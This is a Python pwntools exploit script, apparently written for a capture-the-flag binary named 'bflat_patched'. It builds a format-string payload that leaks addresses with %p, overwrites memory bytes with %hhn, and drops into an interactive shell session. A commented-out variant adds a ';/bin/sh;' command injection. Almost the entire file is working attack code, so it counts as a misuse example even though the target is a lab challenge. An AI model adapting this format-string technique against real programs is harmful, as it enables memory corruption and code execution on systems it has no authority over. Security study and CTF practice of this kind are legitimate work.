#!/usr/bin/python3

from pwn import *
import time

exe = ELF('bflat_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())

# b* $rcx+174
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
    
    brva 0x13B3
    if (char)$rsp != 0x68
    kill
    q
    end
    ''')
        input()

p = process(exe.path)
GDB()
payload = b''
payload += b'AAAA'
payload += b'%c'*7 + b'%p'      # Print msort_param address out to check faster
payload += b'%c'*8
payload += f'%{0x50-13}c%hhn'.encode()
payload += b'%c'*12
payload += f'%{0xc4}c%hhn'.encode()
# payload += f'%*c%{0xf02b - 0x130}c%n;/bin/sh;'.encode()

payload = payload.ljust(1000, b'\0')
parts = b''
part_count = 0
for i in range(0, len(payload), 4):
    part_count += 1
    parts += str(u32(payload[i:i+4])).encode() + b' '

sln(b'ints?\n', str(part_count))
sl(parts)
sl(b'-9')
p.interactive()
